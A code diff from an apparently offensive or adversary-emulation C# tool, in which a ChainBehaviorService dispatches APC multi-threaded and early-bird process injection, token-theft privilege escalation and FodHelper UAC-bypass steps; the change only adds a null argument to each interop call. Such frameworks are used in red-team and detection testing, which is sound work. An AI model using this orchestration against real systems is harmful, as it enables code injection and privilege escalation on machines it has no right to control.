@@ -45,7 +45,7 @@ public class ChainBehaviorService
                     await WriteBehaviorContext(context);
                     break;
                 case "Apc-MultiThreaded":
-                    var code4 = InteropInjection.InjectPayloadApcMultiThreaded(injection.TargetPid ?? 0, payload, (nuint)payload.Length);
+                    var code4 = InteropInjection.InjectPayloadApcMultiThreaded(injection.TargetPid ?? 0, payload, (nuint)payload.Length, null);
                     LoggerService.Write($"[Chain] APC multi-threaded injection result: {code4}");
                     break;
                 case "Apc-EarlyBird":
@@ -58,7 +58,7 @@ public class ChainBehaviorService
                         PayloadPath = injection.PayloadName
                     };
                     await WriteBehaviorContext(context2);
-                    var code5 = InteropInjection.InjectPayloadApcEarlyBird(injection.ProgramName!, payload, (nuint)payload.Length);
+                    var code5 = InteropInjection.InjectPayloadApcEarlyBird(injection.ProgramName!, payload, (nuint)payload.Length, null);
                     LoggerService.Write($"[Chain] APC early bird injection result: {code5}");
                     break;
             }
@@ -70,12 +70,12 @@ public class ChainBehaviorService
             switch (privEsc.Behavior)
             {
                 case "TokenTheft":
-                    var code1 = InteropPrivilegeEscalation.TokenTheftEscalation(privEsc.TargetPid ?? 0);
+                    var code1 = InteropPrivilegeEscalation.TokenTheftEscalation(privEsc.TargetPid ?? 0, null);
                     LoggerService.Write($"[Chain] TokenTheft result: {code1}");
                     break;
                 case "FodHelperAbuse":
                     Console.WriteLine($"[Chain] FodHelperAbuse command: {privEsc.ExecPath}");
-                    var code2 = InteropPrivilegeEscalation.FodHelperAbuseEscalation(privEsc.ExecPath);
+                    var code2 = InteropPrivilegeEscalation.FodHelperAbuseEscalation(privEsc.ExecPath, null);
                     LoggerService.Write($"[Chain] FodHelperAbuse result: {code2}");
                     break;
             }
